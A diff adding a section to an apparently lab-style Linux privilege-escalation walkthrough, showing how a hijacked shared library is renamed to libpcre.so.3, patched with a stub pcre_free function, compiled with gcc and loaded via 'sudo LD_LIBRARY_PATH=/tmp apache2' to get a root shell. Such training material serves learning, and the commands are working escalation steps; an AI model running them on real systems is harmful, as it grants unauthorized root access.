@@ -617,6 +617,39 @@ Running `apache2` using `sudo` and setting the `LD_LIBRARY_PATH` to the folder l
 
 <br />
 
+As a final step in this task we will be renaming the `/tmp/libcrypt.so.1` shared file to a different process name and attempting to get root using the same `LD_LIBRARY_PATH`.
+
+```
+mv /tmp/libcrypt.so.1 /tmp/libpcre.so.3
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172321131-b9cdc52c-1d13-47af-9f37-ab965948fb9f.png)
+
+Attempting to run `apache2` with `sudo` however this time will display an error stating the `pcre_free` function was not found.
+
+![image](https://user-images.githubusercontent.com/14150485/172321426-6c87fbd7-7c64-4fac-af09-03e14dd39428.png)
+
+There are multiple ways we can use to add this to the `library_path.c` file. The easiest way is for us to use the `echo` command to add a line at the end of the program with a void `pcre_free` function:
+
+```
+echo "void pcre_free(){}" >> /home/user/tools/sudo/library_path.c
+```
+The next step is to compile the new file:
+
+```
+gcc -o /tmp/libpcre.so.3 -shared -fPIC /home/user/tools/sudo/library_path.c
+```
+
+Running `apache2` with `sudo` using the `LD_LIBRARY_PATH` should now successfully spawn a root shell:
+
+```
+sudo LD_LIBRARY_PATH=/tmp apache2
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172322578-c461bb11-428b-4c9f-be67-feff7deea65a.png)
+
+<br/>
+
 ### 7.1: Read and follow along with the above.
 
 ```
